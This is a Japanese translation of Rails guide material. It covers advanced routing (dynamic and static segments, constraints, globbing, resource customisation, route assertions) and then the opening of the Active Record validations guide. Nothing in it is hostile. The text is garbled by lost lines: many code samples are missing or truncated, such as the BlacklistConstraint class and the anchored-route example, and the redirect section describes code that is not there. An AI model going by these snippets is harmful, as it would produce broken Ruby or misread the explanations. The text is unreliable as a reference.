ブラウザからの`/photos/show/1`リクエストが上のルーティングで処理される (他のルーティング設定にはマッチしなかったとします) と、`Photos`コントローラの`show`アクションが呼び出され、URL末尾のパラメータ`"1"`へのアクセスは`params[:id]`で行なえます。
`:action`と`:id`が必須パラメータではないことがかっこ () で示されているので、このルーティングは`/photos`を`PhotosController#index`にルーティングすることもできます。
### 動的なセグメント
通常のルーティングの一部として、文字列を固定しない動的なセグメントを自由に使用できます。
`:controller`や`:action`を除き、どんなものでも`params`の一部に含めてアクションに渡すことができます。
以下のルーティングを設定したとします。
get ':controller/:action/:id/:user_id'
ブラウザからの`/photos/show/1/2`パスは`Photos`コントローラの`show`アクションに割り当てられます。
`params[:id]`には`"1"`、`params[:user_id]`には`"2"`がそれぞれ保存されます。
NOTE: `:controller`パスセグメントを使用する場合、`:namespace`や`:module`を併用することはできません。
どうしても使用したいのであれば、以下のように、必要な名前空間だけにマッチするように`:controller`に制限を加えます。
get ':controller(/:action(/:id))', controller: /admin\/[^\/]+/
TIP: 動的なセグメント分割ではドット`.`をデフォルトでは使用できません。ドットはフォーマット済みルーティングでは区切り文字として使用されるためです。
どうしても動的セグメント内でドットを使用したい場合は、デフォルト設定を上書きする制限を与えます。たとえば`id: /[^\/]+/`とすると、スラッシュ以外のすべての文字が使用できます。
### 静的なセグメント
ルート作成時にコロンを付けなかった部分は、静的なセグメントとして固定文字列が指定されます。
get ':controller/:action/:id/with_user/:user_id'
上のルーティングは、`/photos/show/1/with_user/2`のようなパスにマッチします。`with_user`の部分は固定されています。
このときアクションで使用できる`params`は `{ controller: 'photos', action: 'show', id: '1', user_id: '2' }`となります。
### クエリ文字列
クエリ文字列 (訳注: `?パラメータ名=値`の形式でURLの末尾に置かれるパラメータ) で指定されているパラメータもすべて`params`に含まれます。
以下のルーティングを例にとってみましょう。
get ':controller/:action/:id'
ブラウザからのリクエストで`/photos/show/1?user_id=2`というパスが渡されると、`Photos`コントローラの`show`アクションに割り当てられます。
このときの`params`は`{ controller: 'photos', action: 'show', id: '1', user_id: '2' }`となります。
### デフォルト設定を定義する
`:controller`シンボルや`:action`シンボルは、ルーティング内で明示的に指定する必要はありません。
これらは以下のようにデフォルトとして指定することができます。
get 'photos/:id', to: 'photos#show'
上のルーティングはブラウザからの`/photos/12`パスにマッチし、`Photos`コントローラの`show`アクションに割り当てられます。
`:defaults`オプションにハッシュを渡すことで、これ以外のデフォルト設定を定義することもできます。
この定義は、動的セグメントとして指定していないパラメータに対しても適用されます。
例:
get 'photos/:id', to: 'photos#show', defaults: { format: 'jpg' }
上のルーティングは`photos/12`にマッチし、`Photos`コントローラの`show`アクションに割り当てられ、`params[:format]`には`"jpg"`が設定されます。
### 名前付きルーティング
`:as`オプションを使用することで、どんなルーティングにも名前を指定できます。
get 'exit', to: 'sessions#destroy', as: :logout
上のルーティングでは`logout_path`と`logout_url`がアプリケーションの名前付きヘルパーとして作成されます。
`logout_path`を呼び出すと`/exit`が返されます。
この方法を使用して、リソースとして定義されているルーティングを以下のように上書きすることもできます。
get ':username', to: 'users#show', as: :user
上のルーティングでは`user_path`メソッドが生成され、コントローラ・ヘルパー・ビューでそれぞれ使用できるようになります。このメソッドは、`/bob`のようなユーザー名を持つルーティングに移動します。
`Users`コントローラの`show`アクションの内部で`params[:username]`にアクセスすると、ユーザー名を取り出すことができます。
パラメータ名を`:username`にしたくない場合は、ルーティング定義の`:username`の部分を変更してください。
### HTTP動詞を制限する
あるルーティングを特定のHTTP動詞に割り当てるために、通常は`get`、`post`、`put`、`patch`、`delete`メソッドのいずれかを使用する必要があります。
`match`メソッドと`:via`オプションを使用することで、複数のHTTP動詞に同時にマッチするルーティングを作成できます。
match 'photos', to: 'photos#show', via: [:get, :post]
`via: :all`を指定すると、すべてのHTTP動詞にマッチする特別なルーティングを作成できます。
match 'photos', to: 'photos#show', via: :all
NOTE: 1つのアクションに`GET`リクエストと`POST`リクエストを両方ルーティングすると、セキュリティに影響する可能性があります。
### セグメントを制限する
`:constraints`オプションを使用すると、動的セグメントのURLフォーマットを特定の形式に制限することができます。
get 'photos/:id', to: 'photos#show', constraints: { id: /[A-Z]\d{5}/ }
上のルーティングは`/photos/A12345`のようなパスにはマッチしますが、`/photos/893`にはマッチしません。
以下のようにもっと簡潔な方法で記述することもできます。
get 'photos/:id', to: 'photos#show', id: /[A-Z]\d{5}/
`:constraints`では正規表現を使用できますが、ここでは正規表現の「アンカー」は使用できないという制限があることにご注意ください。
たとえば、以下のルーティングは無効です。
対象となるルーティングはすべて初めからアンカーされているので、このようなアンカー表現を使用する必要はないはずです。
get '/:username', to: 'users#show'
### リクエスト内容に応じて制限を加える
リクエストに応じた制限は、セグメントを制限するときと同様の方法で指定することができます。
ブロックフォームに対して制限を指定することもできます。
  constraints subdomain: 'admin' do
従って、制限された値は、対応するRequestオブジェクトメソッドが返す型と一致する必要があります。
たとえば、`constraints: { subdomain: 'api' }`という制限は`api`サブドメインに期待どおりマッチしますが、`constraints: { subdomain: :api }`のようにシンボルを使用した場合は`api`サブドメインに一致しません。`request.subdomain`が返す`'api'`は文字列型であるためです。
### 高度な制限
より高度な制限を使用したい場合、Railsで必要な`matches?`に応答できるオブジェクトを渡す方法があります。
例として、ブラックリストに記載されているすべてのユーザーを`BlacklistController`にルーティングしたいとします。
この場合、以下のように設定します。
class BlacklistConstraint
  def initialize
    @ips = Blacklist.retrieve_ips
  def matches?(
    @ips.include?(
Rails.application.routes.draw do
  get '*path', to: 'blacklist#index',
    constraints: BlacklistConstraint.new
制限をラムダとして指定することもできます。
    constraints: lambda { |request| Blacklist.retrieve_ips.include?(
request.remote_ip) }
`matches?`メソッドおよびラムダはいずれも引数として`request`オブジェクトを取ります。
### ルーティンググロブとワイルドカードセグメント
ルーティンググロブ (route globbing) とはワイルドカード展開のことであり、ルーティングのある位置から下のすべての部分に特定のパラメータをマッチさせる際に使用します。
get 'photos/*other', to: 'photos#unknown'
上のルーティングは`photos/12`や`/photos/long/path/to/12`にマッチし、`params[:other]`には`"12"`や`"long/path/to/12"`が設定されます。
先頭にアスタリスク`*`が付いている部分を「ワイルドカードセグメント」と呼びます。
ワイルドカードセグメントはルーティングのどの部分でも使用できます。
get 'books/*section/:title', to: 'books#show'
上は`books/some/section/last-words-a-memoir`にマッチし、`params[:section]`には`'some/section'`が保存され、`params[:title]`には`'last-words-a-memoir'`が保存されます。
技術上は、1つのルーティングに2つ以上のワイルドカードセグメントを含めることは可能です。
マッチャがセグメントをパラメータに割り当てる方法は直感的です。
get '*a/foo/*b', to: 'test#index'
上のルーティングは`zoo/woo/foo/bar/baz`にマッチし、`params[:a]`には`'zoo/woo'`が保存され、and `params[:b]`には`'bar/baz'`が保存されます。
Rails 3.0.xの動作に戻したい場合は、以下のように`format: false`を指定することができます。
get '*pages', to: 'pages#show', format: false
NOTE: このセグメントフォーマットを必須にしたい場合は、以下のように`format: true`を指定します。
get '*pages', to: 'pages#show', format: true
ルーティングで`redirect`を使用すると、あるパスを他のあらゆるパスにリダイレクトできます。
パスにマッチする動的セグメントを再利用してリダイレクトすることもできます。
リダイレクトにブロックを渡すこともできます。このリダイレクトは、シンボル化されたパスパラメータとrequestオブジェクトを受け取ります。
ここで行われているリダイレクトは、HTTPステータスで言う「301 "Moved Permanently"」であることにご注意ください。
一部のWebブラウザやプロキシサーバーはこの種のリダイレクトをキャッシュすることがあり、その場合リダイレクト前の古いページにはアクセスできなくなります。
どの場合であっても、ホスト (`http://www.example.com`など) がURLの冒頭で指定されていない場合は、Railsは (以前のリクエストではなく) 現在のリクエストから詳細を取得します。
### Rackアプリケーションにルーティングする
match '/application.js', to: Sprockets, via: :all
Railsルーターから見れば、`Sprockets`が`call`に応答して`[status, headers, body]`を返す限り、ルーティング先がRackアプリケーションであるかアクションであるかは区別できません。
これは`via: :all`の適切な利用法です。というのは、適切と考えられるすべてのHTTP動詞をRackアプリケーションで扱えるようにできるからです。
### `root`を使用する
`root`メソッドを使用することで、Railsがルート`'/'`とすべき場所を指定できます。
root to: 'pages#main'
root 'pages#main' # 上の省略形
`root`ルーティングは、ルーティングファイルの先頭に記述してください。rootは最もよく使用されるルーティングであり、最初にマッチする必要があるからです。
NOTE: `root`ルーティングがアクションに渡せるのは`GET`リクエストだけです。
名前空間やスコープの内側にrootを置くこともできます。
  root to: "admin#index"
root to: "home#index"
### Unicode文字列をルーティングで使用する
Unicode文字列をルーティングで直接使用することもできます。
get 'こんにちは', to: 'welcome#index'
リソースフルルーティングをカスタマイズする
Railsでは、リソースフルなヘルパーの一般的などの部分であっても事実上自由にカスタマイズ可能です。
### 使用するコントローラを指定する
`:controller`オプションは、リソースで使用するコントローラを明示的に指定します。
resources :photos, controller: 'images'
上のルーティングは、`/photos`で始まるパスを認識しますが、ルーティング先を`Images`コントローラにします。
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
| --------- | ---------------- | ----------------- | -------------------- |
| GET       | /photos          | images#index      | photos_path          |
| GET       | /photos/new      | images#new        | new_photo_path       |
| POST      | /photos          | images#create     | photos_path          |
| GET       | /photos/:id      | images#show       | photo_path(:id)      |
| GET       | /photos/:id/edit | images#edit       | edit_photo_path(:id) |
| PATCH/PUT | /photos/:id      | images#update     | photo_path(:id)      |
| DELETE    | /photos/:id      | images#destroy    | photo_path(:id)      |
NOTE: このリソースへのパスを生成するには`photos_path`や`new_photo_path`などを使用してください。
名前空間内のコントローラは以下のように直接指定することができます。
resources :user_permissions, controller: 'admin/user_permissions'
上は`Admin::UserPermissions`にルーティングされます。
NOTE: ここでサポートされている記法は、`/`で区切る「ディレクトリ式」のみです。
Rubyの定数表記法 (`controller: 'Admin::UserPermissions'`など) をコントローラに対して使用すると、ルーティングで問題が生じ、警告が出力される可能性があります。
### 制限を指定する
`:constraints`オプションを使用すると、暗黙で使用される`id`に対してフォーマットを指定することができます。
上の宣言は`:id`パラメータに制限を加え、指定した正規表現にのみマッチするようにします。
従って、上の例では`/photos/1`のようなパスにはマッチしなくなります。
代わって、`/photos/RR27`のようなパスにマッチするようになります。
ブロックフォームを使用することで、多数のルーティングに対して1つの制限をまとめて与えることもできます。
constraints(id: /[A-Z][A-Z][0-9]+/) do
  resources :photos
  resources :accounts
NOTE: もちろん、この場合であれば「リソースフルでない」ルーティングに適用可能な、より高度な制限を加えることもできます。
TIP: `:id`パラメータではドット`.`をデフォルトでは使用できません。ドットはフォーマット済みルーティングでは区切り文字として使用されるためです。
どうしても`:id`内でドットを使用したい場合は、デフォルト設定を上書きする制限を与えます。たとえば`id: /[^\/]+/`とすると、スラッシュ以外のすべての文字が使用できます。
### 名前付きヘルパーをオーバーライドする
`:as`オプションを使用すると、名前付きルーティングヘルパーを上書きして異なる名前を使用できます。
resources :photos, as: 'images'
上のルーティングでは、`/photos`で始まるブラウザからのパスを認識し、このリクエストを`Photos`コントローラにルーティングしますが、ヘルパーの命名に`:as`オプションの値が使用されます。
| GET       | /photos          | photos#index      | images_path          |
| GET       | /photos/new      | photos#new        | new_image_path       |
| POST      | /photos          | photos#create     | images_path          |
| GET       | /photos/:id      | photos#show       | image_path(:id)      |
| GET       | /photos/:id/edit | photos#edit       | edit_image_path(:id) |
| PATCH/PUT | /photos/:id      | photos#update     | image_path(:id)      |
| DELETE    | /photos/:id      | photos#destroy    | image_path(:id)      |
### `new`セグメントや`edit`セグメントをオーバーライドする
resources :photos, path_names: { new: 'make', edit: 'change' }
これにより、ルーティングで以下のようなパスが認識できるようになります。
/photos/make
/photos/1/change
NOTE: このオプションを指定しても、実際のアクション名が変更されるわけではありません。
変更後のパスを使用しても、ルーティング先は依然として`new`アクションと`edit`アクションのままです。
TIP: このオプションによる変更をすべてのルーティングに統一的に適用したくなった場合は、スコープを使用できます。
scope path_names: { new: 'make' } do
  # 残りすべてのルーティング
### 名前付きルーティングヘルパーにプレフィックスを追加する
`:as`オプションを使用することで、Railsがルーティングに対して生成する名前付きルーティングヘルパー名の冒頭に文字を追加できます (プレフィックス)。
パススコープを使用するルーティング同士での名前の衝突を避けたい場合に使用してください。
scope 'admin' do
  resources :photos, as: 'admin_photos'
ルーティングヘルパーのグループにプレフィックスを追加するには、以下のように`scope`メソッドで`:as`オプションを使用します。
scope 'admin', as: 'admin' do
  resources :photos, :accounts
resources :photos, :accounts
上によって、`admin_photos_path`と`admin_accounts_path`などのルーティングが生成されます。これらは`/admin/photos`と`/admin/accounts`にそれぞれ割り当てられます。
NOTE: `namespace`スコープを使用すると、`:module`や`:path`プレフィックスに加えて`:as`も自動的に追加されます。
名前付きパラメータを持つルーティングにプレフィックスを追加することもできます。
scope ':username' do
### ルーティングの作成を制限する
`:only`オプションや`:except`オプションを使用することで、これらのルーティングを微調整できます。
`:only`オプションは、指定されたルーティングだけを生成するよう指示します。
resources :photos, only: [:index, :show]
これで、`/photos`への`GET`リクエストは成功し、`/photos` への`POST`リクエスト (通常であれば`create`アクションにルーティングされます) は失敗します。
`:except`オプションは逆に、指定したルーティングのみを生成 _しない_ よう指示します。
resources :photos, except: :destroy
この場合、`destroy` (`/photos/:id`への`DELETE`リクエスト) を除いて通常のルーティングが生成されます。
TIP: アプリケーションでRESTfulルーティングが多数使用されているのであれば、それらに適宜`:only`や`:except`を使用して、本当に必要なルーティングのみを生成することで、メモリ使用量の節約とルーティングプロセスの速度向上が見込めます。
### パスを変更する
`scope`メソッドを使用することで、`resource`によって生成されるデフォルトのパス名を変更できます。
scope(path_names: { new: 'neu', edit: 'bearbeiten' }) do
  resources :categories, path: 'kategorien'
上のようにすることで、以下のような`Categories`コントローラへのルーティングが作成されます。
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
| --------- | -------------------------- | ------------------ | ----------------------- |
| GET       | /kategorien                | categories#index   | categories_path         |
| GET       | /kategorien/neu            | categories#new     | new_category_path       |
| POST      | /kategorien                | categories#create  | categories_path         |
| GET       | /kategorien/:id            | categories#show    | category_path(:id)      |
| GET       | /kategorien/:id/bearbeiten | categories#edit    | edit_category_path(:id) |
| PATCH/PUT | /kategorien/:id            | categories#update  | category_path(:id)      |
| DELETE    | /kategorien/:id            | categories#destroy | category_path(:id)      |
### 「単数形のフォーム」をオーバーライドする
あるリソースの「単数形のフォーム」を定義したい場合、`Inflector`に活用形ルールを追加します。
ActiveSupport::Inflector.inflections do |inflect|
  inflect.irregular 'tooth', 'teeth'
### 名前付きリソースで`:as`を使用する
`:as`を使用すると、ネストしたルーティングヘルパー内のリソース用に自動生成された名前をオーバーライドできます。
  resources :ads, as: 'periodical_ads'
上のルーティングによって、`magazine_periodical_ads_url`や`edit_magazine_periodical_ad_path`などのルーティングヘルパーが生成されます。
パラメータ
ルーティングの調査とテスト
Railsには、ルーティングを調べる機能とテストする機能が備わっています。
### 既存のルールを一覧表示する
ターミナルで`rake routes`コマンドを実行しても同じ結果を得られます。
どちらの方法を使用した場合でも、`routes.rb`ファイルに記載された順にルーティングが表示されます。
1つのルーティングについて以下の情報が表示されます。
* ルーティング名 (あれば)
* 使用されているHTTP動詞 (そのルーティングがすべてのHTTP動詞に応答するのでない場合)
* マッチするURLパターン
* そのルーティングで使用するパラメータ
以下は、あるRESTfulルーティングに対して`rake routes`を実行した結果から抜粋したものです。
    users GET    /users(.:format)          users#index
          POST   /users(.:format)          users#create
edit_user GET    /users/:id/edit(.:format) users#edit
`CONTROLLER`環境変数を設定することで、ルーティング一覧の表示を特定のコントローラにマップされたものに制限することもできます。
TIP: 折り返しが発生しないぐらいに十分大きなサイズのターミナルを使用できるのであれば、`rake routes`コマンドの出力の方がおそらく読みやすいでしょう。
### ルーティングをテストする
アプリケーションの他の部分と同様、ルーティング部分もテスティング戦略に含めておくべきでしょう。
Railsでは、テスティングを容易にするために3つの[ビルトインアサーション](http://api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html) が用意されています。
* `assert_generates`
* `assert_recognizes`
* `assert_routing`
#### `assert_generates`アサーション
`assert_generates`は、特定のオプションの組み合わせを使用した場合に特定のパスが生成されること、そしてそれらがデフォルトのルーティングでもカスタムルーティングでも使用できることをテストするアサーション (assert, assertion: 主張・検証とも) です。
assert_generates '/photos/1', { controller: 'photos', action: 'show', id: '1' }
assert_generates '/about', controller: 'pages', action: 'about'
#### `assert_recognizes`アサーション
`assert_recognizes`は`assert_generates`と逆方向のテスティングを行います。
与えられたパスが認識可能であること、アプリケーションの特定の場所にルーティングされることをテストするアサーションです。
assert_recognizes({ controller: 'photos', action: 'show', id: '1' }, '/photos/1')
引数で`:method`を使用してHTTP動詞を指定することもできます。
assert_recognizes({ controller: 'photos', action: 'create' }, { path: 'photos', method: :post })
#### `assert_routing`アサーション
`assert_routing`アサーションは、ルーティングを2つの観点 (与えられたパスによってオプションが生成されること、そのオプションによって元のパスが生成されること) からチェックします。
つまり、`assert_generates`と`assert_recognizes`の機能を組み合わせたものになります。
assert_routing({ path: 'photos', method: :post }, { controller: 'photos', action: 'create' })
Active Record バリデーション
このガイドでは、Active Recordのバリデーション (検証: validation) 機能を使用して、オブジェクトがデータベースに保存される前にオブジェクトの状態を検証する方法について説明します。
* ビルトインのActive Recordバリデーションヘルパーの使用
* カスタムのバリデーションメソッドの作成
* バリデーションプロセスで生成されたエラーメッセージの取り扱い
バリデーションの概要
きわめてシンプルなバリデーションの例を以下に紹介します。
Person.create(name: "John Doe").valid? 
Person.create(name: nil).valid? 
上からわかるように、このバリデーションでは`Person`に`name`属性がない場合に無効であることを知らせます。
2つ目の`Person`はデータベースに保存されません。
バリデーションの詳細を説明する前に、アプリケーション全体においてバリデーションがいかに重要であるかについて説明します。
### バリデーションを行なう理由
バリデーションは、正しいデータだけをデータベースに保存するために行われます。
たとえば、自分のアプリケーションで、すべてのユーザーには必ず電子メールアドレスとメーリングリストアドレスが必要だとします。
正しいデータだけをデータベースに保存するのであれば、モデルレベルでバリデーションを実行するのが最適です。
モデルレベルでのバリデーションは、データベースに依存せず、エンドユーザーがバイパスすることもできず、テストも保守も容易だからです。
Railsではバリデーションを簡単に利用できるよう、一般に利用可能なビルトインヘルパーが用意されており、自前のバリデーションメソッドを作成することもできるようになっています。
データをデータベースに保存する前にバリデーションを実行する方法は、他にもデータベースネイティブの制約機能、クライアント側でのバリデーション、コントローラレベルのバリデーションなど、多くの方法があります。
それぞれのメリットとデメリットは以下のとおりです。
* クライアント側でのバリデーションは扱いやすく便利ですが、一般に単独では信頼性が不足します。
JavaScriptを使用してバリデーションを実装する場合、ユーザーがJavaScriptをオフにしてしまえばバイパスされてしまいます。
ただし、他の方法と併用するのであれば、クライアント側でのバリデーションはユーザーに即座にフィードバックを返すための便利な方法となるでしょう。
* コントローラレベルのバリデーションは一度はやってみたくなるものですが、たいてい手に負えなくなり、テストも保守も困難になりがちです。
アプリケーションの寿命を永らえ、保守作業を苦痛なものにしないようにするためには、コントローラのコード量は可能な限り減らすべきです。
上で紹介したその他のバリデーションについては、特定の状況に応じて適宜追加してください。
Railsチームは、ほとんどの場合モデルレベルのバリデーションが最も適切であると考えています。
### バリデーション実行時の動作
Active Recordのオブジェクトには2種類あります。オブジェクトがデータベースの行(row)に対応しているものと、そうでないものです。
たとえば、`new`メソッドを使用して新しくオブジェクトを作成しただけでは、オブジェクトはデータベースに属していません。
`save`メソッドを呼ぶことで、オブジェクトは適切なデータベースのテーブルに保存されます。
Active Recordの`new_record?`インスタンスメソッドを使用して、オブジェクトが既にデータベース上にあるかどうかを確認できます。
次の単純なActive Recordクラスを例に取ってみましょう。
`rails console`の出力で様子を観察してみます。
>> p = Person.new(name: "John Doe")
=> #<Person id: nil, name: "John Doe", created_at: nil, updated_at: nil>
>> p.new_record?
>> p.save
=> false
新規レコードを作成して保存すると、SQLの`INSERT`操作がデータベースに送信されます。
既存のレコードを更新すると、SQLの`UPDATE`操作が送信されます。
バリデーションは、SQLのデータベースへの送信前に行うのが普通です。
バリデーションのいずれかが失敗すると、オブジェクトは無効(invalid)とマークされ、Active Recordでの`INSERT`や`UPDATE`操作は行われません。
これにより、無効なオブジェクトがデータベースに保存されることを防止します。
オブジェクトの作成、保存、更新時に特定のバリデーションを実行することもできます。
CAUTION: データベース上のオブジェクトの状態を変える方法は1つとは限りません。
メソッドには、バリデーションをトリガするものと、しないものがあります。
この点に注意しておかないと、バリデーションが設定されているにもかかわらず、データベース上のオブジェクトが無効な状態になってしまう可能性があります。
以下のメソッドではバリデーションがトリガされ、オブジェクトが有効な場合にのみデータベースに保存されます。
* `create`
* `create!
* `save`
* `save!
* `update`
* `update!
破壊的なメソッド(`save!`など)では、レコードが無効な場合に例外が発生します。
非破壊的なメソッドでは無効な場合に例外を発生しません。`save`と`update`は無効な場合に`false`を返し、`create`は無効な場合に単にそのオブジェクトを返します。
### バリデーションのスキップ
以下のメソッドはバリデーションを行わずにスキップします。オブジェクトの保存は、有効無効にかかわらず行われます。
これらのメソッドの使用には注意が必要です。
* `decrement!
* `decrement_counter`
* `increment!
* `increment_counter`
* `toggle!
* `touch`
* `update_all`
* `update_attribute`
* `update_column`
* `update_columns`
* `update_counters`
実は、`save`に`validate: false`を引数として与えると、`save`のバリデーションをスキップすることができてしまいます。
この手法は注意深く使用する必要があります。
* `save(validate: false)`
### `valid?`と`invalid?
Railsでオブジェクトが有効(valid)であるかどうかを検証するには、`valid?`メソッドを使用します。
このメソッドは単独で使用できます。`valid?`を実行するとバリデーションがトリガされ、オブジェクトにエラーがない場合はtrueが返され、そうでなければfalseが返されます。
これは以下のように実装できます。
Active Recordでバリデーションが行われた後は、`errors.messages`インスタンスメソッドを使用すると、発生したエラーにアクセスできます。このメソッドはエラーのコレクションを返します。
定義上は、バリデーション実行後にコレクションが空になった場合は有効です。
`new`を使用してインスタンス化されたオブジェクトは、仮に技術的に無効であってもエラーは報告されないので、注意が必要です。`new`ではバリデーションは実行されません。
>> p = Person.new
# => #<Person id: nil, name: nil>
>> p.errors.messages
>> p.valid?
# => {name:["空欄にはできません"]}
>> p = Person.create
>> p.save!
# => ActiveRecord::RecordInvalid: Validation failed: 空欄にはできません
>> Person.create!
`invalid?`は単なる`valid?`の逆の動作です。
このメソッドはバリデーションをトリガし、オブジェクトでエラーが発生した場合はtrueを、そうでなければfalseを返します。
### `errors[]`
`errors[:attribute]`を使用して、特定のオブジェクトの属性が有効であるかどうかを確認できます。
このメソッドは、`:attribute`のすべてのエラーの配列を返します。
指定された属性でエラーが発生しなかった場合は、空の配列が返されます。
このメソッドが便利なのは、 _after_ で始まるバリデーションを実行する場合だけです。このメソッドはエラーのコレクションを調べるだけで、バリデーションそのものをトリガしないからです。
このメソッドは、前述の`ActiveRecord::Base#invalid?`メソッドとは異なります。このメソッドはオブジェクト全体の正当性については確認しないためです。
オブジェクトの個別の属性についてエラーがあるかどうかだけを調べます。
>> Person.new.errors[:name].any? 
>> Person.create.errors[:name].any? 
より高度なレベルでのバリデーションエラーについては、[バリデーションエラーの取り扱い](#バリデーションエラーに対応する)セクションを参照してください。
それまでは、Railsがデフォルトで提供するビルトインのバリデーションヘルパーを中心に解説します。
バリデーションヘルパー
------------------
Active Recordには、クラス定義の内側で直接使用できる定義済みのバリデーションヘルパーが多数用意されています。
これらのヘルパーは、共通のバリデーションルールを提供します。
バリデーションが失敗するたびに、オブジェクトの`errors`コレクションにエラーメッセージが追加され、そのメッセージは、バリデーションが行われる属性に関連付けられます。
どのヘルパーも任意の数の属性を受け付けることができるので、1行のコードを書くだけで多くの属性に対して同じバリデーションを実行できます。
`:on`オプションと`:message`オプションはどのヘルパーでも使用できます。これらのオプションはそれぞれ、バリデーションを実行するタイミングと、バリデーション失敗時に`errors`コレクションに追加するメッセージを指定します。
`:on`オプションは`:create`または`:update`のいずれかの値を取ります。
バリデーションヘルパーには、それぞれデフォルトのエラーメッセージが用意されています。
`:message`オプションが使用されていない場合はデフォルトのメッセージが使用されます。
利用可能なヘルパーを1つずつ見ていきましょう。
### `acceptance`
このメソッドは、フォームが送信されたときにユーザーインターフェイス上のチェックボックスがオンになっているかどうかを検証します。
ユーザーにサービス利用条項への同意、何らかの文書に目を通すことなどを義務付けるのに使用するのが典型的な利用法です。
このバリデーションはWebアプリケーション特有のものなので、'acceptance'はデータベースに保存する必要はありません。保存用のフィールドを作成しなかった場合、ヘルパーは単に仮想の属性を作成します。
  validates :terms_of_service, acceptance: true
このヘルパーのデフォルトエラーメッセージは _"must be accepted"_ です。
このヘルパーでは`:accept`オプションを使用できます。このオプションは、「受付済み」を表す値を指定します。
デフォルトは"1"ですが、容易に変更できます。
  validates :terms_of_service, acceptance: { accept: 'yes' }
### `validates_associated`
モデルが他のモデルに関連付けられていて、両方のモデルに対してバリデーションを実行する必要がある場合はこのヘルパーを使用します。
オブジェクトを保存しようとすると、関連付けられているオブジェクトごとに`valid?`が呼び出されます。
class Library < ActiveRecord::Base
  has_many :books
  validates_associated :books
このバリデーションは、あらゆる種類の関連付けに対して使用できます。
CAUTION: `validates_associated`は関連付けの両側のオブジェクトでは実行しないでください。
関連付けの両側でこのヘルパーを使用すると無限ループになります。
`validates_associated`のデフォルトエラーメッセージは _"is invalid"_ です。
関連付けられたオブジェクトにも自分の`errors`コレクションが含まれるので、エラーは呼び出し元のモデルまでは伝わりません。
### `confirmation`
このヘルパーは、2つのテキストフィールドが完全に一致する内容を受け取る必要がある場合に使用します。
たとえば、メールアドレスやパスワードで、確認フィールドを使用するとします。
このバリデーションヘルパーは仮想の属性を作成します。その属性の名前は、確認したい属性名に "_confirmation" を追加したものになります。
  validates :email, confirmation: true
ビューテンプレートで以下のようなフィールドを用意します。
<%= text_field :person, :email %>
<%= text_field :person, :email_confirmation %>
このチェックは、`email_confirmation`が`nil`でない場合のみ実施されます。
確認を必須にするには、確認用の属性について存在チェックも追加しておくようにしてください。`presence`を使用した存在チェックについてはこの後解説します。
  validates :email_confirmation, presence: true
このヘルパーのデフォルトメッセージは _"doesn't match confirmation"_ です。
### `exclusion`
このヘルパーは、与えられた集合に属性の値が含まれて「いない」ことを検証します。
集合としては任意のenumerableオブジェクトが使用できます。
class Account < ActiveRecord::Base
  validates :subdomain, exclusion: { in: %w(www us ca jp),
    message: "%{value}は予約済みです" 
`exclusion`ヘルパーの`:in`オプションには、バリデーションを行った属性の値に含めたくない値の集合を指定します。
`:in`オプションには`:within`というエイリアスもあり、好みに応じてどちらでも使用できます。
上の例では、`:message`オプションを使用して属性の値を含める方法を示しています。
デフォルトのエラーメッセージは _"is reserved"_ です。
### `format`
このヘルパーは、`with`オプションで与えられた正規表現と属性の値がマッチするかどうかをテストすることによってバリデーションを行います。
  validates :legacy_code, format: { with: /\A[a-zA-Z]+\z/,
    message: "英文字のみが使用できます" }
デフォルトのエラーメッセージは _"is invalid"_ です。
### `inclusion`
このヘルパーは、与えられた集合に属性の値が含まれているかどうかを検証します。
class Coffee < ActiveRecord::Base
  validates :size, inclusion: { in: %w(small medium large),
`inclusion`ヘルパーには`:in`オプションがあり、受け付け可能とする値の集合を指定します。
`:in`オプションには`:within`というエイリアスもあり、好みに応じてどちらでも使用できます。
上の例では、属性の値をインクルードする方法を示すために`:message`オプションも使用しています。
このヘルパーのデフォルトのエラーメッセージは _"is not included in the list"_ です。
### `length`
このヘルパーは、属性の値の長さを検証します。
多くのオプションがあり、長さ制限をさまざまな方法で指定できます。
  validates :name, length: { minimum: 2 }
  validates :bio, length: { maximum: 500 }
  validates :password, length: { in: 6..20 }
  validates :registration_number, length: { is: 6 }
使用可能な長さ制限オプションは以下のとおりです。
* `:minimum` - 属性はこの値より小さな値を取れません。
* `:maximum` - 属性はこの値より大きな値を取れません。
* `:in` または `:within` - 属性の長さは、与えられた区間以内でなければなりません。
このオプションの値は範囲でなければなりません。
* `:is` - 属性の長さは与えられた値と等しくなければなりません。
デフォルトのエラーメッセージは、実行されるバリデーションの種類によって異なります。
デフォルトのメッセージは`:wrong_length`、`:too_long`、`:too_short`オプションを使用してカスタマイズしたり、`%{count}`を長さ制限に対応する数値のプレースホルダとして使用したりできます。
`:message`オプションを使用してエラーメッセージを指定することもできます。
  validates :bio, length: { maximum: 1000,
このヘルパーはデフォルトでは文字単位で長さをチェックしますが、`:tokenizer`オプションを使用することで他の方法で値を区分することもできます。
class Essay < ActiveRecord::Base
  validates :content, length: {
    minimum: 300,
    maximum: 400,
    too_short: "%{count}語以上必要です",
デフォルトのエラーメッセージは複数形で表現されていることにご注意ください (例: "is too short (minimum is %{count} characters)")。
このため、`:minimum`を1に設定するのであればメッセージをカスタマイズして単数形にするか、代りに`presence: true`を使用します。
### `numericality`
このヘルパーは、属性に数値のみが使用されていることを検証します。
デフォルトでは、整数または浮動小数点にマッチします。これらの冒頭に符号が付いている場合もマッチします。
整数のみにマッチさせたい場合は、`:only_integer`をtrueにします。
`:only_integer`を`true`に設定すると、
上の正規表現を使用して属性の値に対するバリデーションが行われます。
それ以外の場合は、`Float`で値を数値に変換してからバリデーションを行おうとします。
WARNING: 上の正規表現では末尾に改行記号があってもマッチします。
class Player < ActiveRecord::Base
  validates :points, numericality: true
  validates :games_played, numericality: { only_integer: true }
このヘルパーは、`:only_integer`以外にも以下のオプションを使用して制限を指定できます。
* `:greater_than` - 指定された値よりも大きくなければならないことを指定します。
デフォルトのエラーメッセージは _"must be greater than %{count}"_ です。
* `:greater_than_or_equal_to` - 指定された値と等しいか、それよりも大きくなければならないことを指定します。
デフォルトのエラーメッセージは _"must be greater than or equal to %{count}"_ です。
* `:equal_to` - 指定された値と等しくなければならないことを示します。
デフォルトのエラーメッセージは _"must be equal to %{count}"_ です。
* `:less_than` - 指定された値よりも小さくなければならないことを指定します。
デフォルトのエラーメッセージは _"must be less than %{count}"_.です。
* `:less_than_or_equal_to` - 指定された値と等しいか、それよりも小さくなければならないことを指定します。
